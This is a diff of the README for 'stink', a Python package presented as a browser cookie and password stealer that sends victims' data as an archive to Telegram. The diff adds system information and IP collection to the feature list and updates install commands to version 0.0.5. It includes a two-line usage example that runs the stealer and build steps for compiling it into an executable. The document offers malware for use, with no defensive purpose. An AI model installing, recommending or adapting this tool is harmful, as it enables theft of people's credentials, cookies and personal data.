@@ -26,17 +26,17 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
 2. Sending collected data as an archive to Telegram.
 3. Running in a separate thread.
 4. Screenshots.
+5. System information gathering.
+6. Collecting IP and other.
 
 ### Future features
 1. Support for other browsers.
-2. System information gathering.
-3. Collecting IP and other.
  
 ## Installation
 
 You can install the latest version with the command:
 ```
-pip install stink==0.0.4
+pip install stink==0.0.5
 ```
 
 ## Example usage
@@ -46,7 +46,7 @@ from stink.multistealer import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
-To enable error output, add the `errors_print=True` parameter.
+To enable error output, add the `errors=True` parameter.
 
 The standard ```Stealer``` runs collection on all available browsers and sends the collected data in an archive to you in Telegram.
 
@@ -146,7 +146,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==0.0.4
+pip install stink==0.0.5
 ```
 6. In the appearing folder venv go to the path `\Lib\site-packages\win32\`.
 7. Copy the file `win32crypt.pyd`.
